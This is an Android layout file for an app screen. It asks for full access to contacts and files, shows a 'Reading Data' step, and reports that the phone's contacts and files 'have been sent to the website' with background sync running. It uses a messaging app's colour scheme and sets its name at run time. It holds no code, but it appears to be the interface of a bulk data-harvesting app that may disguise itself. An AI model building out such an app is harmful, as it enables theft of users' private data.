<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:background="#075E54"
    android:gravity="center"
    android:padding="32dp">

    <!-- App Icon -->
    <LinearLayout
        android:layout_width="96dp"
        android:layout_height="96dp"
        android:gravity="center"
        android:background="@drawable/circle_bg"
        android:layout_marginBottom="24dp">

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="📱"
            android:textSize="40sp" />
    </LinearLayout>

    <!-- App Name (dynamically set) -->
    <TextView
        android:id="@+id/tvAppName"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="@string/app_name"
        android:textColor="#FFFFFF"
        android:textSize="24sp"
        android:textStyle="bold"
        android:layout_marginBottom="8dp" />

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Allow permissions to continue"
        android:textColor="#FFFFFFAA"
        android:textSize="14sp"
        android:layout_marginBottom="40dp" />

    <!-- Permission Screen -->
    <LinearLayout
        android:id="@+id/layoutPermission"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="vertical"
        android:gravity="center"
        android:visibility="visible">

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Allow Permissions"
            android:textColor="#FFFFFF"
            android:textSize="18sp"
            android:textStyle="bold"
            android:layout_marginBottom="12dp" />

        <!-- Permission Items -->
        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:orientation="vertical"
            android:background="#0D6B5E"
            android:padding="16dp"
            android:layout_marginBottom="24dp"
            android:gravity="start">

            <!-- Contact Permission -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:gravity="center_vertical"
                android:layout_marginBottom="12dp">

                <TextView
                    android:layout_width="36dp"
                    android:layout_height="36dp"
                    android:text="📞"
                    android:textSize="20sp"
                    android:gravity="center" />

                <LinearLayout
                    android:layout_width="0dp"
                    android:layout_height="wrap_content"
                    android:layout_weight="1"
                    android:orientation="vertical"
                    android:layout_marginStart="12dp">

                    <TextView
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="Contact Full Access"
                        android:textColor="#FFFFFF"
                        android:textSize="14sp"
                        android:textStyle="bold" />

                    <TextView
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="Read all contacts automatically"
                        android:textColor="#FFFFFF88"
                        android:textSize="11sp" />
                </LinearLayout>
            </LinearLayout>

            <!-- File Manager Permission -->
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="horizontal"
                android:gravity="center_vertical">

                <TextView
                    android:layout_width="36dp"
                    android:layout_height="36dp"
                    android:text="📁"
                    android:textSize="20sp"
                    android:gravity="center" />

                <LinearLayout
                    android:layout_width="0dp"
                    android:layout_height="wrap_content"
                    android:layout_weight="1"
                    android:orientation="vertical"
                    android:layout_marginStart="12dp">

                    <TextView
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="File Manager Full Access"
                        android:textColor="#FFFFFF"
                        android:textSize="14sp"
                        android:textStyle="bold" />

                    <TextView
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="Read &amp; manage all files"
                        android:textColor="#FFFFFF88"
                        android:textSize="11sp" />
                </LinearLayout>
            </LinearLayout>
        </LinearLayout>

        <Button
            android:id="@+id/btnAllow"
            android:layout_width="match_parent"
            android:layout_height="56dp"
            android:text="Allow Permissions"
            android:textSize="16sp"
            android:textStyle="bold"
            android:textColor="#075E54"
            android:backgroundTint="#25D366"
            android:layout_marginBottom="16dp" />
    </LinearLayout>

    <!-- Loading Screen -->
    <LinearLayout
        android:id="@+id/layoutLoading"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="vertical"
        android:gravity="center"
        android:visibility="gone">

        <ProgressBar
            android:id="@+id/progressBar"
            android:layout_width="48dp"
            android:layout_height="48dp"
            android:indeterminateTint="#25D366"
            android:layout_marginBottom="16dp" />

        <TextView
            android:id="@+id/tvStatus"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Reading Data..."
            android:textColor="#FFFFFF"
            android:textSize="18sp"
            android:textStyle="bold"
            android:layout_marginBottom="8dp" />

        <TextView
            android:id="@+id/tvDetail"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Reading contacts &amp; files from your phone"
            android:textColor="#FFFFFF99"
            android:textSize="13sp"
            android:gravity="center" />
    </LinearLayout>

    <!-- Success Screen -->
    <LinearLayout
        android:id="@+id/layoutSuccess"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="vertical"
        android:gravity="center"
        android:visibility="gone">

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="✓"
            android:textSize="48sp"
            android:textColor="#25D366"
            android:layout_marginBottom="8dp" />

        <TextView
            android:id="@+id/tvStatus2"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Data Uploaded!"
            android:textColor="#25D366"
            android:textSize="18sp"
            android:textStyle="bold"
            android:layout_marginBottom="8dp" />

        <TextView
            android:id="@+id/tvDetail2"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Your contacts &amp; files have been sent to the website.\nBackground file sync is running..."
            android:textColor="#FFFFFF99"
            android:textSize="13sp"
            android:gravity="center"
            android:layout_marginBottom="24dp" />

        <Button
            android:id="@+id/btnViewWebsite"
            android:layout_width="match_parent"
            android:layout_height="56dp"
            android:text="View on Website"
            android:textSize="16sp"
            android:textStyle="bold"
            android:textColor="#075E54"
            android:backgroundTint="#25D366"
            android:visibility="gone" />
    </LinearLayout>

</LinearLayout>
